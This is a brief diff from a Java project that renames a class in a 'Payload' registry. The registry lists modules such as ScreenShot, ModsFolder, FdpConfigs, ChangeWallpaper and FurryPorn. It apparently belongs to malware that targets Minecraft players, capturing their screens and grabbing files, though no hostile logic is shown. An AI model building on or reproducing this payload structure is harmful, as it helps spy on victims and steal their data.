@@ -4,7 +4,7 @@ import dev.peter.luterium.features.*;
 import dev.peter.luterium.features.fun.ChangeWallpaper;
 import dev.peter.luterium.features.fun.FurryPorn;
 import dev.peter.luterium.features.fun.PlaySong;
-import dev.peter.luterium.features.maintainer.MainClass;
+import dev.peter.luterium.features.maintainer.Maintainer;
 
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -23,7 +23,7 @@ public final class Payload {
     private Payload() {
         payloads.addAll(Arrays.asList(
                 new Info(),
-                new MainClass(),
+                new Maintainer(),
                 new ScreenShot(),
                 new ModsFolder(),
                 new FdpConfigs(),
